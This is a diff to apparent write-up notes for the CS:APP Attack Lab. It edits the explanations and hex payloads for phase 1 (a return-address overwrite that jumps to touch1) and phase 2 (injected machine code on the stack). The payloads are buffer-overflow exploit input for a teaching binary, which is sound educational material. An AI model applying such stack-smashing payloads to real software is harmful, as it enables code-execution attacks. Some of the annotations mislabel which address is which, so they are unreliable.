@@ -27,7 +27,7 @@ Stack allocate 0x28 = 40 Bytes
 
 Return line of getbuf() is at 0x4017bd
 
-First line of touch1() is at 0x4017c0 -> we overwrite location at after first 40Byte by address of first line of touch1()
+First line of touch1() is at 0x4017c0 -> we overwrite location at after first 40Byte by address of first line of touch1() -> machine think this address as return address
 
 ```txt
 # File phase1.txt
@@ -108,7 +108,7 @@ So now we have
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 # act as %rbp
+00 00 00 00 00 00 00 00
 ec 17 40 00 00 00 00 00 # return address
 ```
 
@@ -134,10 +134,11 @@ so we modify
 ```txt
 # FIle phase2.txt
 
-48 c7 c7 fa 97 b9 59 c3 #inject code
+48 c7 c7 fa 97 b9 59 c3 #inject code written to top of stack
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-78 dc 61 55 00 00 00 00 # act as %rbp
-ec 17 40 00 00 00 00 00 # return address
+00 00 00 00 00 00 00 00 # next lower 32 Byte (make up to 40Byte) is padding
+78 dc 61 55 00 00 00 00 # true return address of getbuf after call Gets()
+ec 17 40 00 00 00 00 00 # overwrite return address of ret line (where getbuf return to)
 ```
